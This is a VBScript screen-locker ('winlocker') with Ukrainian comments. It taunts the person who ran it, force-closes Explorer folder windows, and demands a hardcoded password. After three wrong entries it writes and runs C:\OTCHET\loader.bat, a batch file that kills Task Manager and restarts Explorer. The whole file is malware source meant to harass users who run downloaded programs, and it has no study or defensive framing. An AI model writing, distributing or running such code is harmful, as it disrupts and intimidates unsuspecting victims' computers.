Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Перевірка, чи запущений скрипт з правами адміністратора
If Not objShell.Run("cmd /c echo Administrative privileges required! && timeout /nobreak 2 >nul", 0, True) = 0 Then
    MsgBox "Please run this script as administrator!", vbExclamation, "Error"
    WScript.Quit
End If

Dim invalidAttempts
invalidAttempts = 0

' Функція для закриття відкритих папок в explorer.exe
Sub CloseExplorerFolders()
    ' Закриття всіх вікон, які належать процесу explorer.exe
    objShell.Run "taskkill /f /fi ""WINDOWTITLE eq *Folder*""", 0, True
End Sub

Do
    MsgBox "AHAHAH, you fell for a winlocker because you download programs during checks", 48, "WINLOCKER"
    ' Закриття відкритих папок в explorer.exe після відображення повідомлення
    CloseExplorerFolders()
    
    x = InputBox("WRITE PASSWORD")
    
    If x = "bra1zer" Then
        MsgBox "By-BY bro ()_()", 64, "WINLOCKER"

        ' Включення диспетчера завдань
        objShell.Run "taskmgr", 0, False
        MsgBox "Task Manager has been enabled.", vbInformation, "Task Manager Check"
        
        ' Перезавантаження explorer.exe
        objShell.Run "taskkill /f /im explorer.exe", 0, True
        objShell.Run "explorer.exe", 0, False
        MsgBox "Explorer.exe has been restarted.", vbInformation, "Explorer.exe Restart"
        
        ' Закриття всіх вікон cmd
        objShell.Run "taskkill /f /fi ""imagename eq cmd.exe""", 0, True
        MsgBox "All cmd windows have been closed.", vbInformation, "Close CMD Windows"

        Exit Do
    Else
        MsgBox "If you enter the wrong password, you will lose your Windows.", 48, "BY-BY EZZ"
        
        invalidAttempts = invalidAttempts + 1
        If invalidAttempts >= 3 Then
            Dim otchetFolder
            Dim loaderFile
            
            ' Створення папки OTCHET на диску C
            Set otchetFolder = objFSO.CreateFolder("C:\OTCHET")
            
            ' Створення файлу loader.bat в папці OTCHET
            Set loaderFile = objFSO.CreateTextFile("C:\OTCHET\loader.bat", True)
            loaderFile.WriteLine("@echo off")
            loaderFile.WriteLine(":check_taskmgr")
            loaderFile.WriteLine("tasklist | find /i ""taskmgr.exe"" > nul")
            loaderFile.WriteLine("if errorlevel 1 (")
            loaderFile.WriteLine("    timeout /t 1 >nul")
            loaderFile.WriteLine("    goto check_taskmgr")
            loaderFile.WriteLine(") else (")
            loaderFile.WriteLine("    taskkill /f /im taskmgr.exe")
            loaderFile.WriteLine(")")
            loaderFile.WriteLine("timeout /t 10 >nul")
            loaderFile.WriteLine("taskkill /f /im explorer.exe")
            loaderFile.WriteLine("timeout /t 15 >nul")
            loaderFile.WriteLine("start explorer.exe")
            loaderFile.Close
            
            ' Запуск loader.bat без затримки
            objShell.Run "C:\OTCHET\loader.bat", 0, False
            
            MsgBox "Folder OTCHET created on drive C:", vbInformation, "Invalid Password Attempts"
            Exit Do
        End If
    End If
Loop Until x = "bra1zer"

Set objShell = Nothing
Set objFSO = Nothing
